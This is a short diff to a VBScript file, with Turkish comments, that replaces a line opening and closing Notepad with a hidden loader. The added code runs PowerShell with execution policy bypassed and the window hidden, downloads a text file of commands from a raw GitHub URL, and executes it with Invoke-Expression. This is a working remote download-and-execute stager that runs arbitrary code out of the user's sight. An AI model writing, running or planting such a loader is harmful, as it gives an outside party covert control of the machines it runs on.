@@ -1,2 +1,9 @@
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -Command ""Start-Process notepad.exe -WindowStyle Hidden -Verb RunAs; Start-Sleep -Seconds 5; Stop-Process -Name notepad -Force""", 0, False
+' Komutları çekeceğin adres
+url = "https://raw.githubusercontent.com/NexoraAPI/project/main/komutlar.txt"
+
+' PowerShell'e diyoruz ki: İnternetteki içeriği indir ve "Invoke-Expression" (IEX) ile çalıştır
+psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('" & url & "')"""
+
+' 0 = Gizli çalıştır
+objShell.Run psCommand, 0, False
